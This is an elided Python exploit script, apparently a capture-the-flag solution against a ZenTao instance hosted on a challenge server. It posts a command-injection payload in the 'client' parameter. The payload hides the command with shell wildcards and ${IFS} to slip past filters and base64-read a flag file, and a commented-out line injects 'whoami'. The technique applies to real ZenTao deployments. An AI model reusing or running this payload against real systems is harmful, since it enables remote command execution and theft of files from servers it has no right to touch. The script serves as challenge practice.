...
def check(url):
    ...
    headers={
        ...
        "Cookie":"zentaosid=ggbond; lang=zh-cn; device=desktop; theme=default",
    }
    ...
    data2 = 'SCM=Git&path=/etc&client=`/???/???/b???64${IFS}/fla? -w 0`'
    # data2 = 'SCM=Git&path=/etc&client=`whoami`'
    s=requests.session()
    try:
...
if __name__ == '__main__':
    print(check("http://c1d213bd-f4c9-4526-b5de-c8c59e63e6a4.node.yuzhian.com.cn:8000/"))